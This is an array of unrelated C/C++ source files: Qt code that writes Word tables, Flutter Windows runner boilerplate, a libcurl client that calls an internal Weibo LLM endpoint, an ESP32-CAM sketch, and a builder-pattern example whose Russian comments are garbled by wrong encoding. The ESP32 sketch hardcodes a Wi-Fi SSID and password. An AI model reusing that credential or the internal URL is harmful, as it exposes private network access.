m_impl->m_activeDoc->querySubObject(\"Tables\");\n    // \u65b0\u5efa\u8868\u683c\u5bf9\u8c61 row\u884c\u6570\u636e+1\uff08\u8868\u5934\uff09\n    QAxObject *table_obj = tables->querySubObject(\"Add(QVariant,int,int)\", range->asVariant(), row + 1, column);\n\n    // \u8868\u683c\u81ea\u52a8\u62c9\u4f38\u5217 0\u56fa\u5b9a  1\u6839\u636e\u5185\u5bb9\u8c03\u6574  2 \u6839\u636e\u7a97\u53e3\u8c03\u6574\n    table_obj->dynamicCall(\"AutoFitBehavior(WdAutoFitBehavior)\", 2);\n\n    const auto &horizontal_headers = table.GetHorizontalHeaders();\n\n    // \u8868\u5934\u8d4b\u503c\u586b\u5145\n    for (int i = 0; i < column; i++)\n    {\n        if (auto *header_cell = table_obj->querySubObject(\"Cell(int,int)\", kTableColBegin, i + 1))\n        {\n            if (auto *range_cell = header_cell->querySubObject(\"Range\"))\n            {\n                // \u8bbe\u7f6e\u8fd9\u4e00\u683c\u7684\u6587\u672c\n                range_cell->dynamicCall(\"SetText(QString)\", horizontal_headers[i]);\n                // \u52a0\u7c97\n                range_cell->dynamicCall(\"SetBold(int)\", 1);\n            }\n        }\n    }\n\n    // \u8868\u683c\u586b\u5145\n    for (int i = 0; i < row; i++)\n    {\n        const auto &row_content = table.GetRow(i);\n        for (int j = 0; j < column; j++)\n        {\n            // \u6307\u5b9a\u67d0\u884c \u67d0\u5217\u7684\u6570\u636e\u5355\u5143\n            if (auto *data_cell = table_obj->querySubObject(\"Cell(int,int)\", i + kTableRowBegin, j + kTableColBegin))\n            {\n                data_cell->dynamicCall(\"Select(void)\");\n                if (auto *data_range = data_cell->querySubObject(\"Range\"))\n                {\n                    // \u586b\u5145\u6587\u672c\n                    data_range->setProperty(\"Text\", row_content[j]);\n                    // \u8bbe\u7f6e\u5b57\u4f53\n                    if (auto *font_obj = data_range->querySubObject(\"Font\"))\n                    {\n                        font_obj->setProperty(\"Size\", 10);\n                        font_obj->setProperty(\"Name\", \"Times New Roman\");\n                    }\n                }\n            }\n        }\n    }\n\n    return *this;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"reto_tancara\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <string>\n#include \"json.hpp\"\n#include <chrono>\n#include <curl/curl.h>\n\nusing json = nlohmann::json;\nusing namespace std::chrono;\n\n//\u56de\u8c03\u51fd\u6570\uff0c\u7528\u4e8e\u5904\u7406 libcurl \u7684\u54cd\u5e94\u6570\u636e\nsize_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* respons){\n    respons->append((char*)contents, size * nmemb);\n    return size * nmemb;\n}\n//\u53d1\u9001 POST \u8bf7\u6c42\u5e76\u8fd4\u56de\u54cd\u5e94\nstd::string SendPostRequest(const std::string& url, const std::string& data){\n    CURL* curl = curl_easy_init();\n    if(curl){\n        //\u8bbe\u7f6e libcurl\n        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());\n        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());\n        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, data.length());\n\n        std::string response_data;\n        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);\n        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);\n\n        //\u53d1\u9001\u8bf7\u6c42\n        CURLcode res = curl_easy_perform(curl);\n        if(res != CURLE_OK){\n            std::cerr << \"curl_easy_perform() failed:\" << curl_easy_strerror(res) << std::endl;\n        }\n\n        curl_easy_cleanup(curl);\n        return  response_data;\n\n    }else{\n        std::cerr << \"Failed to initialize libcurl \" << std::endl;\n        return \"\";\n    }\n}\n\nstd::string chatqwen(const std::string& message){\n    //\u6784\u9020\u8bf7\u6c42\u51fd\u6570\n    json datas = {\n            {\"temprature\" , 0.1},\n            {\"max_tokends\" , 4000},\n            {\"rid\" , 31000},\n            {\"model\" , \"qwen2\"},\n            {\"messages\" , json::array({\n                                              {{\"role\",\"user\"}, {\"content\",message}}\n                                      })},\n    };\n    //\u8bbe\u7f6e\u8bf7\u6c42\u5934\n    std::string data = datas.dump();\n\n    std::string url = \"http://llm-yizhuang.multimedia.wml.weibo.com/mm-wb-ml-hotmblog/qwen15-72b-chat-weibo-search-topic-65e83a5c/generate\";\n//    std::string url = \"http://minisearch.chatglm3-6b-32k.wml.weibo.com/mm-wb-ml-hotmblog/chatglm3-6b-32k/generate\";\n    std::string response_data = SendPostRequest(url, data);\n\n    //\u89e3\u6790\u54cd\u5e94\u6570\u636e\n    std::string txt;\n    try{\n        json res = json::parse(response_data);\n        txt = res[\"choices\"][0][\"message\"][\"content\"];\n    }catch(const std::exception& e){\n        std::cerr<< \" Error parsing json : \"<< e.what() << std::endl;\n    }\n\n    return  txt;\n}\n\nint main(int argc, char* argv[]){\n\n    std::cout << argc << std::endl;\n\n    if(argc <2 ){\n        std::cerr << \" Usage: \"<< argv[0] << \" <msg> \" << std::endl;\n        return  1;\n    }\n\n    std::string encode_msg = argv[1];//\u624dC++ \u4e2d\u4e0d\u9700\u8981\u8f6c\u79fb html\u5b9e\u4f53\n    std::string bash_prompt = \"\u6211\u5bf9\u4f60\u6709\u4ee5\u4e0b\u8981\u6c42\uff1a\" \\\n             \"1.\u6211\u8981\u6c42\u4f60\u5fc5\u987b\u82f1\u6587\u56de\u590d\u6211\" \\\n             \"2.\u4f60\u73b0\u5728\u662f\u6587\u5b57\u60c5\u611f\u4e13\u5bb6\u548c\u753b\u9762\u63cf\u8ff0\u4e13\u5bb6,\u7ed9\u4f60\u4e00\u6bb5\u81ea\u7136\u8bed\u8a00\uff0c\" \\\n             \"\u4f60\u7406\u89e3\u8fd9\u6bb5\u8bed\u8a00\u5e76\u4e14\u505a\u51fa\u8be6\u7ec6\u7684\u60c5\u7eea\u8868\u8fbe\u3001\u573a\u666f\u3001\u5929\u6c14\u4e0e\u80cc\u666f\u6216\u8005\u573a\u666f\u7b49\u5143\u7d20\u63cf\u8ff0\u7684\u56de\u590d\uff0c\" \\\n             \"\u53ef\u4ee5\u6839\u636e\u4f60\u81ea\u8eab\u7684\u80fd\u529b\u81ea\u7531\u53d1\u6325\uff0c\" \\\n             \"\u8ba9\u4eba\u53ef\u4ee5\u589e\u52a0\u6ce8\u610f\u529b\u5230\u753b\u9762\u5f53\u4e2d,\u753b\u9762\u4e2d\u4e0d\u8981\u6709\u4eba\u7c7b,\u76f4\u63a5\u56de\u590d\u753b\u9762\u5185\u5bb9,\u4e0d\u9700\u8981\u6709\u804a\u5929\u4e92\u52a8\uff0c\" \\\n             \"\u5c06\u753b\u9762\u4ee5\u5ba0\u7269\u72d7\u7684\u5f62\u5f0f\u8868\u8fbe\u51fa\u6765,\u63cf\u8ff0\u5ba0\u7269\u72d7\u7684\u65f6\u5019\u4f7f\u7528a dog \u4ee3\u66ff\u5177\u4f53\u72d7\u7684\u54c1\u79cd\u6bdb\u8272\u7b49\uff0c\u56de\u590d\u7684\u5185\u5bb9\u7cbe\u70bc\u4e00\u4e9b\uff0c\u5c06\u573a\u666f\u5177\u4f53\u4e3a\u67d0\u4e9b\u5143\u7d20\uff0c\u6bd4\u5982\u63cf\u8ff0\u5929\u7a7a\u7684\u5143\u7d20\u662f\u84dd\u5929\u3001\u661f\u7a7a\uff0c\u63cf\u8ff0\u5149\u7ebf\u662f\u67d4\u7f8e\u7684\u5149\u7b49\" \\\n             \"\u81ea\u7136\u8bed\u8a00\u662f\uff1a\";\n    std::string message = bash_prompt + encode_msg;\n    std::cout << message << std::endl;\n\n    auto start_time = high_resolution_clock::now();\n    std::string response = chatqwen(message);\n\n    auto end_time = high_resolution_clock::now();\n\n    auto duration = duration_cast<seconds>(end_time - start_time);\n\n    std::cout<<response << std::endl;\n    std::cout << \"\u7a0b\u5e8f\u8fd0\u884c\u65f6\u95f4\uff1a  \" << duration.count() <<\"\u79d2\" << std::endl;\n\n    return 0;\n}",
    "#include <eloquent_esp32cam.h>\n#include <WiFi.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <vector>\n#include <ESP32Servo.h>\n// #include <cstring>\n\n\n#define WIFI_SSID \"Backbone\"\n#define WIFI_PASSWORD \"GMUBackbone@123\"\n#define HOSTNAME  \"esp32cam\"\n\n\n#define HOST \"192.168.1.127\"\n#define PORT 4000\n#define MOTOR 12\n\n\nWiFiClient client;\n\nServo myservo;\nint x_1, y_1, x_2, y_2;\nvoid setup() {\n  // put your setup code here, to run once:\n    delay(3000);\n    Serial.begin(115200);\n    Serial.println(\"___Camera Streamer___\");\n    myservo.attach(MOTOR, 1000, 2000);\n    myservo.setPeriodHertz(50);\n    // camera settings\n    // replace with your own model!\n    eloq::camera.pinout.aithinker();\n    eloq::camera.brownout.disable();\n    // Edge Impulse models work on square images\n    // face resolution is 240x240\n    eloq::camera.resolution.face();\n    eloq::camera.quality.high();\n\n    // init camera\n    while (!eloq::camera.begin().isOk())\n        Serial.println(eloq::camera.exception.toString());\n\n    // connect to WiFi\n        WiFi.begin(WIFI_SSID, WIFI_PASSWORD);\n\n    while (WiFi.status() != WL_CONNECTED) {\n        delay(500);\n        Serial.print(\".\");\n    }\n\n  \n  if(!client.connect(HOST, PORT)){\n    return;\n  }\n}\n\nString objDetect(){\n    \n    if (!eloq::camera.capture().isOk()) {\n        Serial.println(eloq::camera.exception.toString());\n        return \"\";\n    }\n    client.print(eloq::camera.frame->len);\n    client.write((const char *) eloq::camera.frame->buf, eloq::camera.frame->len);\n    client.flush();\n    x_1 = client.readStringUntil(',').toInt();\n    y_1 = client.readStringUntil(',').toInt();\n    x_2 = client.readStringUntil(',').toInt();\n    y_2 = client.readStringUntil(',').toInt();\n    String str = client.readStringUntil('#');\n    return \"\";\n}\n\nvoid loop() {\n  // put your main code here, to run repeatedly:\n\n    if(!client.connected()){\n      if(!client.connect(HOST, PORT)){\n        Serial.printf(\".\");\n        return;\n      }    \n      delay(500);\n    }\n  \n  String detection = objDetect();\n  if (detection.length() > 0){\n    \n    Serial.printf(\"x1:%d, y1:%d, x2:%d, y2:%d\", x_1, y_1, x_2, y_2);\n    \n  }\n\n}",
    "#include <iostream>\r\n#include <string>\r\n#include <ctime>\r\nusing namespace std;\r\n\r\n/* \u00cf\u00e0\u00f2\u00f2\u00e5\u00f0\u00ed \u00d1\u00f2\u00f0\u00ee\u00e8\u00f2\u00e5\u00eb\u00fc \u00ee\u00f2\u00e4\u00e5\u00eb\u00ff\u00e5\u00f2 \u00ea\u00ee\u00ed\u00f1\u00f2\u00f0\u00f3\u00e8\u00f0\u00ee\u00e2\u00e0\u00ed\u00e8\u00e5 \u00f1\u00eb\u00ee\u00e6\u00ed\u00ee\u00e3\u00ee \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2\u00e0 \u00ee\u00f2 \u00e5\u00e3\u00ee \u00ef\u00f0\u00e5\u00e4\u00f1\u00f2\u00e0\u00e2\u00eb\u00e5\u00ed\u00e8\u00ff, \u00f2\u00e0\u00ea \u00f7\u00f2\u00ee\r\n\t   \u00e2 \u00f0\u00e5\u00e7\u00f3\u00eb\u00fc\u00f2\u00e0\u00f2\u00e5 \u00ee\u00e4\u00ed\u00ee\u00e3\u00ee \u00e8 \u00f2\u00ee\u00e3\u00ee \u00e6\u00e5 \u00ef\u00f0\u00ee\u00f6\u00e5\u00f1\u00f1\u00e0 \u00ea\u00ee\u00ed\u00f1\u00f2\u00f0\u00f3\u00e8\u00f0\u00ee\u00e2\u00e0\u00ed\u00e8\u00ff \u00ec\u00ee\u00e3\u00f3\u00f2 \u00ef\u00ee\u00eb\u00f3\u00f7\u00e0\u00f2\u00fc\u00f1\u00ff \u00f0\u00e0\u00e7\u00ed\u00fb\u00e5 \u00ef\u00f0\u00e5\u00e4\u00f1\u00f2\u00e0\u00e2\u00eb\u00e5\u00ed\u00e8\u00ff.\r\n\t\u00cf\u00f0\u00e8\u00ec\u00e5\u00ed\u00e8\u00ec\u00ee\u00f1\u00f2\u00fc\r\n\t   - \u00e0\u00eb\u00e3\u00ee\u00f0\u00e8\u00f2\u00ec \u00f1\u00ee\u00e7\u00e4\u00e0\u00ed\u00e8\u00ff \u00f1\u00eb\u00ee\u00e6\u00ed\u00ee\u00e3\u00ee \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2\u00e0 \u00ed\u00e5 \u00e4\u00ee\u00eb\u00e6\u00e5\u00ed \u00e7\u00e0\u00e2\u00e8\u00f1\u00e5\u00f2\u00fc \u00ee\u00f2 \u00f2\u00ee\u00e3\u00ee, \u00e8\u00e7 \u00ea\u00e0\u00ea\u00e8\u00f5 \u00f7\u00e0\u00f1\u00f2\u00e5\u00e9 \u00f1\u00ee\u00f1\u00f2\u00ee\u00e8\u00f2 \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2 \u00e8 \u00ea\u00e0\u00ea \u00ee\u00ed\u00e8 \u00f1\u00f2\u00fb\u00ea\u00f3\u00fe\u00f2\u00f1\u00ff \u00ec\u00e5\u00e6\u00e4\u00f3 \u00f1\u00ee\u00e1\u00ee\u00e9;\r\n\t   - \u00ef\u00f0\u00ee\u00f6\u00e5\u00f1\u00f1 \u00ea\u00ee\u00ed\u00f1\u00f2\u00f0\u00f3\u00e8\u00f0\u00ee\u00e2\u00e0\u00ed\u00e8\u00ff \u00e4\u00ee\u00eb\u00e6\u00e5\u00ed \u00ee\u00e1\u00e5\u00f1\u00ef\u00e5\u00f7\u00e8\u00e2\u00e0\u00f2\u00fc \u00f0\u00e0\u00e7\u00eb\u00e8\u00f7\u00ed\u00fb\u00e5 \u00ef\u00f0\u00e5\u00e4\u00f1\u00f2\u00e0\u00e2\u00eb\u00e5\u00ed\u00e8\u00ff \u00ea\u00ee\u00ed\u00f1\u00f2\u00f0\u00f3\u00e8\u00f0\u00f3\u00e5\u00ec\u00ee\u00e3\u00ee \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2\u00e0.\r\n   \u00cf\u00eb\u00fe\u00f1\u00fb \u00e8 \u00ec\u00e8\u00ed\u00f3\u00f1\u00fb \u00ef\u00e0\u00f2\u00f2\u00e5\u00f0\u00ed\u00e0 \u00f1\u00f2\u00f0\u00ee\u00e8\u00f2\u00e5\u00eb\u00fc \u00e8 \u00e5\u00e3\u00ee \u00ef\u00f0\u00e8\u00ec\u00e5\u00ed\u00e5\u00ed\u00e8\u00ff:\r\n\t- \u00ef\u00ee\u00e7\u00e2\u00ee\u00eb\u00ff\u00e5\u00f2 \u00e8\u00e7\u00ec\u00e5\u00ed\u00ff\u00f2\u00fc \u00e2\u00ed\u00f3\u00f2\u00f0\u00e5\u00ed\u00ed\u00e5\u00e5 \u00ef\u00f0\u00e5\u00e4\u00f1\u00f2\u00e0\u00e2\u00eb\u00e5\u00ed\u00e8\u00e5 \u00ef\u00f0\u00ee\u00e4\u00f3\u00ea\u00f2\u00e0\r\n\t- \u00e8\u00e7\u00ee\u00eb\u00e8\u00f0\u00f3\u00e5\u00f2 \u00ea\u00ee\u00e4, \u00f0\u00e5\u00e0\u00eb\u00e8\u00e7\u00f3\u00fe\u00f9\u00e8\u00e9 \u00ea\u00ee\u00ed\u00f1\u00f2\u00f0\u00f3\u00e8\u00f0\u00ee\u00e2\u00e0\u00ed\u00e8\u00e5 \u00e8 \u00ef\u00f0\u00e5\u00e4\u00f1\u00f2\u00e0\u00e2\u00eb\u00e5\u00ed\u00e8\u00e5\r\n\t- \u00e4\u00e0\u00e5\u00f2 \u00e1\u00ee\u00eb\u00e5\u00e5 \u00f2\u00ee\u00ed\u00ea\u00e8\u00e9 \u00ea\u00ee\u00ed\u00f2\u00f0\u00ee\u00eb\u00fc \u00ed\u00e0\u00e4 \u00ef\u00f0\u00ee\u00f6\u00e5\u00f1\u00f1\u00ee\u00ec \u00ea\u00ee\u00ed\u00f1\u00f2\u00f0\u00f3\u00e8\u00f0\u00ee\u00e2\u00e0\u00ed\u00e8\u00ff\r\n   */\r\n\r\n/*\r\n\t matrix (\u00ef\u00f0\u00ee\u00e4\u00f3\u00ea\u00f2) \u00ef\u00f0\u00e5\u00e4\u00f1\u00f2\u00e0\u00e2\u00eb\u00ff\u00e5\u00f2 \u00f1\u00eb\u00ee\u00e6\u00ed\u00fb\u00e9 \u00ea\u00ee\u00ed\u00f1\u00f2\u00f0\u00f3\u00e8\u00f0\u00f3\u00e5\u00ec\u00fb\u00e9 \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2. \r\n\t ConcreteBuilder \u00f1\u00f2\u00f0\u00ee\u00e8\u00f2 \u00e2\u00ed\u00f3\u00f2\u00f0\u00e5\u00ed\u00ed\u00e5\u00e5 \u00ef\u00f0\u00e5\u00e4\u00f1\u00f2\u00e0\u00e2\u00eb\u00e5\u00ed\u00e8\u00e5 \u00ef\u00f0\u00ee\u00e4\u00f3\u00ea\u00f2\u00e0 \u00e8 \u00ee\u00ef\u00f0\u00e5\u00e4\u00e5\u00eb\u00ff\u00e5\u00f2 \u00ef\u00f0\u00ee\u00f6\u00e5\u00f1\u00f1 \u00e5\u00e3\u00ee \u00f1\u00e1\u00ee\u00f0\u00ea\u00e8.\r\n*/\r\n\r\nclass Body\r\n{\r\nprotected:\r\n\tstd::string name;\r\n\tstd::string color;\r\npublic:\r\n\tvoid SetName(string name)\r\n\t{\r\n\t\tthis->name = name;\r\n\t}\r\n\tvoid SetColor(string color)\r\n\t{\r\n\t\tthis->color = color;\r\n\t}\r\n\tstring GetName()\r\n\t{\r\n\t\treturn name;\r\n\t}\r\n\tstring GetColor()\r\n\t{\r\n\t\treturn color;\r\n\t}\r\n\tvoid PrintBody()\r\n\t{\r\n\t\tstd::cout << \"Car body\\nName: \" << name << \"\\nColor: \" << color << '\\n';\r\n\t}\r\n};\r\n\r\nclass Engine\r\n{\r\nprotected:\r\n\tstd::string name;\r\n\tint power;\r\npublic:\r\n\tvoid SetName(string name)\r\n\t{\r\n\t\tthis->name = name;\r\n\t}\r\n\tvoid SetPower(int power)\r\n\t{\r\n\t\tthis->power = power;\r\n\t}\r\n\tstring GetName()\r\n\t{\r\n\t\treturn name;\r\n\t}\r\n\tint GetPower()\r\n\t{\r\n\t\treturn power;\r\n\t}\r\n\tvoid PrintEngine()\r\n\t{\r\n\t\tstd::cout << \"Car engine\\nName: \" << name << \"\\nHourse power: \" << power << '\\n';\r\n\t}\r\n};\r\n\r\nclass GearBox\r\n{\r\nprotected:\r\n\tstd::string type;\r\n\tint count;\r\npublic:\r\n\tvoid SetType(string type)\r\n\t{\r\n\t\tthis->type = type;\r\n\t}\r\n\tvoid SetCount(int count)\r\n\t{\r\n\t\tthis->count = count;\r\n\t}\r\n\tstring GetType()\r\n\t{\r\n\t\treturn type;\r\n\t}\r\n\tint GetCount()\r\n\t{\r\n\t\treturn count;\r\n\t}\r\n\tvoid PrintGearBox()\r\n\t{\r\n\t\tstd::cout << \"Car gearbox\\nType: \" << type << \"\\nCount: \" << count << '\\n';\r\n\t}\r\n};\r\n\r\nclass WheelsBuilderPrototype abstract\r\n{\r\nprotected:\r\n\tint wheels;\r\npublic:\r\n\tint GetWheels()\r\n\t{\r\n\t\treturn wheels;\r\n\t}\r\n\tvirtual void SetWheels() abstract;\r\n};\r\n\r\nclass WheelsBuilder1 : public WheelsBuilderPrototype\r\n{\r\npublic:\r\n\tvoid SetWheels() override\r\n\t{\r\n\t\twheels = 13;\r\n\t}\r\n};\r\n\r\nclass WheelsBuilder2 : public WheelsBuilderPrototype\r\n{\r\npublic:\r\n\tvoid SetWheels() override\r\n\t{\r\n\t\twheels = 14;\r\n\t}\r\n};\r\n\r\nclass WheelsBuilder3 : public WheelsBuilderPrototype\r\n{\r\npublic:\r\n\tvoid SetWheels() override\r\n\t{\r\n\t\twheels = 16;\r\n\t}\r\n};\r\n\r\nclass EngineBuilderPrototype abstract\r\n{\r\nprotected:\r\n\tEngine engine;\r\npublic:\r\n\tEngine GetEngine()\r\n\t{\r\n\t\treturn engine;\r\n\t}\r\n\tvirtual void SetName() abstract;\r\n\tvirtual void SetPower() abstract;\r\n};\r\n\r\nclass EngineBuilder1 : public EngineBuilderPrototype\r\n{\r\npublic:\r\n\tvoid SetName() override\r\n\t{\r\n\t\tengine.SetName(\"Lanos\");\r\n\t}\r\n\tvoid SetPower() override\r\n\t{\r\n\t\tengine.SetPower(98);\r\n\t}\r\n};\r\n\r\nclass EngineBuilder2 : public EngineBuilderPrototype\r\n{\r\npublic:\r\n\tvoid SetName() override\r\n\t{\r\n\t\tengine.SetName(\"Ford\");\r\n\t}\r\n\tvoid SetPower() override\r\n\t{\r\n\t\tengine.SetPower(160);\r\n\t}\r\n};\r\n\r\nclass EngineBuilder3 : public EngineBuilderPrototype\r\n{\r\npublic:\r\n\tvoid SetName() override\r\n\t{\r\n\t\tengine.SetName(\"UAZ\");\r\n\t}\r\n\tvoid SetPower() override\r\n\t{\r\n\t\tengine.SetPower(120);\r\n\t}\r\n};\r\n\r\nclass BodyBuilderPrototype abstract\r\n{\r\nprotected:\r\n\tBody body;\r\npublic:\r\n\tBody GetBody()\r\n\t{\r\n\t\treturn body;\r\n\t}\r\n\tvirtual void SetName() abstract;\r\n\tvirtual void SetColor() abstract;\r\n};\r\n\r\nclass BodyBuilder1 : public BodyBuilderPrototype\r\n{\r\npublic:\r\n\tvoid SetName() override\r\n\t{\r\n\t\tbody.SetName(\"Sedan\");\r\n\t}\r\n\tvoid SetColor() override\r\n\t{\r\n\t\tbody.SetColor(\"Red\");\r\n\t}\r\n};\r\n\r\nclass BodyBuilder2 : public BodyBuilderPrototype\r\n{\r\npublic:\r\n\tvoid SetName() override\r\n\t{\r\n\t\tbody.SetName(\"Cupe\");\r\n\t}\r\n\tvoid SetColor() override\r\n\t{\r\n\t\tbody.SetColor(\"Blue\");\r\n\t}\r\n};\r\n\r\nclass BodyBuilder3 : public BodyBuilderPrototype\r\n{\r\npublic:\r\n\tvoid SetName() override\r\n\t{\r\n\t\tbody.SetName(\"Universal\");\r\n\t}\r\n\tvoid SetColor() override\r\n\t{\r\n\t\tbody.SetColor(\"Green\");\r\n\t}\r\n};\r\n\r\nclass GearBoxBuilderPrototype abstract\r\n{\r\nprotected:\r\n\tGearBox gearbox;\r\npublic:\r\n\tGearBox GetGearBox()\r\n\t{\r\n\t\treturn gearbox;\r\n\t}\r\n\tvirtual void SetType() abstract;\r\n\tvirtual void SetCount() abstract;\r\n};\r\n\r\nclass GearBoxBuilder1 : public GearBoxBuilderPrototype\r\n{\r\npublic:\r\n\tvoid SetType() override\r\n\t{\r\n\t\tgearbox.SetType(\"Manual\");\r\n\t}\r\n\tvoid SetCount() override\r\n\t{\r\n\t\tgearbox.SetCount(5);\r\n\t}\r\n};\r\n\r\nclass GearBoxBuilder2 : public GearBoxBuilderPrototype\r\n{\r\npublic:\r\n\tvoid SetType() override\r\n\t{\r\n\t\tgearbox.SetType(\"Auto\");\r\n\t}\r\n\tvoid SetCount() override\r\n\t{\r\n\t\tgearbox.SetCount(4);\r\n\t}\r\n};\r\n\r\nclass GearBoxBuilder3 : public GearBoxBuilderPrototype\r\n{\r\npublic:\r\n\tvoid SetType() override\r\n\t{\r\n\t\tgearbox.SetType(\"Manual\");\r\n\t}\r\n\tvoid SetCount() override\r\n\t{\r\n\t\tgearbox.SetCount(4);\r\n\t}\r\n};\r\n\r\nclass C",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"push2\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
